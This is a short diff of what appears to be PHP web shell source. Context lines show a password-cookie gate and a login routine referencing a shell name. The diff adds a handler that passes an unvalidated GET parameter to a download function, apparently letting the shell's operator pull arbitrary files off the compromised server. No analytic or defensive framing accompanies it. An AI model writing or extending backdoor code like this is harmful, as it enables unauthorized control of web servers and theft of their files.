@@ -30,3 +30,5 @@ if($_COOKIE['postpass'] != md5(postpass)){
 	islogin($shellname,$myurl);
 	exit;
 }
+
+if(isset($_GET['down'])) do_down($_GET['down']);
